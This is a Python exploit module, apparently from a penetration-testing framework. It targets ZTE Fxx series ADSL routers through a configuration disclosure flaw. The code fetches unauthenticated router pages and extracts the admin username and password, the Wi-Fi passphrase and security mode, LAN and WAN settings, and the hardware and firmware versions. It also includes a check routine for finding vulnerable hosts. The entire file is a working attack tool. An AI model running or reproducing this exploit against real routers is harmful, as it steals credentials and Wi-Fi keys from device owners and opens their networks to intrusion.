#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'
import re
import requests
import utils
import prettytable
from template.exploit import BaseExploit


class Exploit(BaseExploit):
    __info__ = {
        'name': 'ZTE Fxx Config Disclosure',
        'description': 'ZTE Fxx serial ADSL Router may leak configs of Internet, wifi and device',
        'reference': [],
    }

    prompt = 'fxx_config'

    def __init__(self):
        super().__init__()
        self.if_checked = False

    def run(self, host, port, timeout):
        address = 'http://{}:{}'.format(host, port)
        user_info_gch = address + '/user_info_gch.gch'
        status_dev_info_t_gch = address + '/status_dev_info_t.gch'
        wlan_config_gch = address + '/wlan_config.gch'
        wlan_security_gch = address + '/wlan_security.gch'
        host_gch_gch = address + '/host_gch.gch'
        status_wan_if_t_gch = address + '/status_wan_if_t.gch'
        info = {
            'username': '',
            'password': '',
            'hardware': '',
            'firmware': '',
            'BSSID': '',
            'ESSID': '',
            'security': '',
            'key': '',
            'Lan address': '',
            'Lan mask': '',
            'Wan info': [],
        }

        resp, err = self.http_get(self.s, user_info_gch, timeout)
        if not err:
            info['username'] = self.regx_grab(resp.text, r"\('Username0','(.*?)'\)")
            info['password'] = self.regx_grab(resp.text, r"\('Password0','(.*?)'\)")

        resp, err = self.http_get(self.s, status_dev_info_t_gch, timeout)
        if not err:
            info['hardware'] = self.regx_grab(resp.text, r'name="Frm_ModelName" class="tdright">(.*?)</td>') + ' ' + \
                               self.regx_grab(resp.text, r'name="Frm_HardwareVer" class="tdright">(.*?)</td>')
            info['firmware'] = self.regx_grab(resp.text, r'name="Frm_SoftwareVer" class="tdright">(.*?)</td>')

        resp, err = self.http_get(self.s, wlan_config_gch, timeout)
        if not err:
            info['ESSID'] = self.regx_grab(resp.text, r"\('ESSID','([^']+)'\)")
            info['BSSID'] = self.regx_grab(resp.text, r"\('Bssid','([^']+)'\)")

        resp, err = self.http_get(self.s, wlan_security_gch, timeout)
        if not err:
            info['key'] = self.regx_grab(resp.text, r"\('KeyPassphrase','([^']+)'\)")
            info['security'] = self.regx_grab(resp.text, r"\('WPAAuthMode','([^']+)'\)")

        resp, err = self.http_get(self.s, host_gch_gch, timeout)
        if not err:
            info['Lan address'] = self.regx_grab(resp.text, r"\('IPRouters','([^']+)'\)")
            info['Lan mask'] = self.regx_grab(resp.text, r"\('SubnetMask','([^']+)'\)")

        resp, err = self.http_get(self.s, status_wan_if_t_gch, timeout)
        if not err:
            wan_reg = re.compile(r'<td(?:.*?)>(.*?)</td>'
                                 r'(?:.*?)'
                                 r'<td(?:.*?)>(.*?)</td>', re.S | re.X)
            pairs = re.findall(wan_reg, resp.text)
            for pair in pairs:
                info['Wan info'].append((pair[0].strip(), pair[1].strip()))

        t = prettytable.PrettyTable()
        t.add_column('Key', ['Username', 'Password', 'Hardware', 'Firmware', 'BSSID', 'ESSID', 'Security',
                             'Key', 'Lan address', 'Lan mask'] + list(map(lambda x: x[0], info['Wan info'])))
        t.add_column('Value', [info['username'], info['password'], info['hardware'], info['firmware'],
                               info['BSSID'], info['ESSID'], info['security'], info['key'], info['Lan address'],
                               info['Lan mask']] + list(map(lambda x: x[1], info['Wan info'])))
        utils.print_info(t)
        utils.logger.send((host, port, t))

    def check(self, host, port, timeout):
        address = 'http://{}:{}'.format(host, port)
        user_info_gch = address + '/user_info_gch.gch'
        resp, err = self.http_get(self.s, user_info_gch, timeout)
        if err:
            self.print_requests_err(host, port, err)
            self.print_check_result(False, host)
        else:
            self.print_check_result(True, host)
            return True

